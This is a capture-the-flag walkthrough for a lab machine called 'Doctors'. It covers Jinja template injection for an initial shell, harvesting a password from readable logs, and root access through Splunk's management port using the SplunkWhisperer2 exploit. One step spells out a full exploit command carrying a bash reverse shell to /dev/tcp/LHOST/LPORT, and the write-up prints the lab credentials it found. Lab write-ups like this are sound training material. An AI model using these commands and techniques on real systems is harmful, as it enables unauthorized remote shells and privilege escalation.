## Foothold

1. Run nmap to see that there are three ports running : 22,80,8089(splunk daemon)
2. Visiting the website we can see a contact info for doctors.htb, therefore adding doctors.htb to /etc/hosts
3. Visiting the website again we can see a login page for users. Try default creds doesn't work.
4. Create a new user and then see source, there is a /archive directory under beta testing. We can create a new message and see that the title is updated in the source of the archive page.
5. We can check for SSTI, through hacktricks cheatsheet and find out that Jinja is being used.
6. We can use our payload using popen (part of subprocess) to get a revshell OR just run the exploit written changing the LHOST and LPORT as it has been hardcoded.
7. We get a shell as the user 'web'

## Priv Esc

8. We can run linpeas and linenum and we can see that we are added to the adm group thus can read /var/log. We can grep for passwords from all the files or check the directory hits from the users. : grep -R /var/log | awk '{print $7}'. We can see there is a reset_password as GET request and the password is provided in the url.
9. We can try the password for shaun (the other user while enum)
10. We can cat out the user.txt.
11. There is a splunk daemon running, we can try loggin in with the new creds, it works.
12. https://github.com/cnotin/SplunkWhisperer2 : is the exploit we can use this exploit to get RCE and thus get a revshell back as root.
13. python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --lhost LHOST --lport LPORT_TO_HOST_SERVER --username shaun --password Guitar123 --payload bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
14. We can get a root shell on the listener. Cat out the root.txt
